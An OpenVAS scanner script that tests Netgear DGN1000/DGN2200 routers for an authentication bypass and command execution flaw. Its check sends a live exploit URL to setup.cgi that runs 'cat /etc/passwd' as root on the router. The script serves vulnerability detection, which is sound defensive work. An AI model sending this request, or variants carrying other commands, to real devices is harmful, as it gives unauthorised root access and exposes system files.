###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_netgear_dgn_remote_code_ex_06_13.nasl 11 2013-10-27 10:12:02Z jan $
#
# Netgear DGN Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Netgear DGN1000 with firmware version prior to 1.1.00.48 and Netgear DGN2200
version 1 suffer from authentication bypass and command execution vulnerabilities.

Attackers can leverage this vulnerability to bypass existing authentication
mechanisms and execute arbitrary commands on the affected devices, with root
privileges.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103728";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 11 $");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

 script_name("Netgear DGN Remote Code Execution Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name:"URL", value:"http://packetstormsecurity.com/files/121860/Netgear-DGN-Authentication-Bypass-Command-Execution.html");
 
 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-06-04 11:47:22 +0200 (Tue, 04 Jun 2013)");
 script_description(desc);
 script_summary("Determine if it is possible to execute a command");
 script_category(ACT_GATHER_INFO);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port:port);
if(!banner || 'Basic realm="NETGEAR DGN' >!< banner)exit(0);

url = '/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=cat+/etc/passwd&curpath=/&currentsetting.htm=1';

if(http_vuln_check(port:port, url:url,pattern:"root:x:0:[01]:.*")) {
     
  security_hole(port:port);
  exit(0);

}

exit(0);
